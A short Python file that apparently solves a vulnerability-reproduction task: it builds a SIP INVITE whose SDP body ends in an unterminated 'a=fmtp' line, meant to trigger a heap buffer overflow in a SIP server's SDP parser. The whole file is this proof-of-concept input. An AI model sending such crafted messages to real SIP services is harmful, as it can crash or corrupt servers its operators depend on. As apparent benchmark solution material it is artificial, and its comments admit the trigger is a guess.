import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is described as a Heap Buffer Overflow in core: parser/sdp
        # where the code "does not check if it is still before the end of the value".
        # This typically happens when the SDP parser scans for a delimiter in a value
        # but the buffer ends abruptly without that delimiter (and without a newline).
        
        # We construct a valid SIP INVITE message to reach the SDP parser.
        sip_headers = [
            b"INVITE sip:service@127.0.0.1 SIP/2.0",
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK-524287-1",
            b"Max-Forwards: 70",
            b"From: <sip:attacker@127.0.0.1>;tag=12345",
            b"To: <sip:victim@127.0.0.1>",
            b"Call-ID: 1234567890@127.0.0.1",
            b"CSeq: 1 INVITE",
            b"Contact: <sip:attacker@127.0.0.1:5060>",
            b"Content-Type: application/sdp"
        ]

        # Construct the SDP body.
        # We include standard fields to set up the parser state.
        # The last line is the trigger: an attribute line that ends abruptly 
        # (no CRLF) and potentially inside a value parsing loop.
        sdp_lines = [
            b"v=0",
            b"o=user 123 456 IN IP4 127.0.0.1",
            b"s=Session",
            b"c=IN IP4 127.0.0.1",
            b"t=0 0",
            b"m=audio 1234 RTP/AVP 0",
            b"a=rtpmap:0 PCMU/8000",
            # The vulnerability likely lies in parsing specific attributes where bounds checks are missing.
            # Providing a trailing space or incomplete value at the exact end of the buffer maximizes the chance 
            # of the parser reading past the allocated memory.
            b"a=fmtp:0 "
        ]

        # Join SDP lines with CRLF, but ensure the final byte of the body is the end of the last line (no trailing CRLF).
        sdp_body = b"\r\n".join(sdp_lines)

        # Set Content-Length to match exactly, ensuring the parser processes up to the very end.
        content_length = len(sdp_body)
        sip_headers.append(f"Content-Length: {content_length}".encode())

        # Assemble the full SIP message: Headers + Double CRLF + Body
        poc_data = b"\r\n".join(sip_headers) + b"\r\n\r\n" + sdp_body

        return poc_data
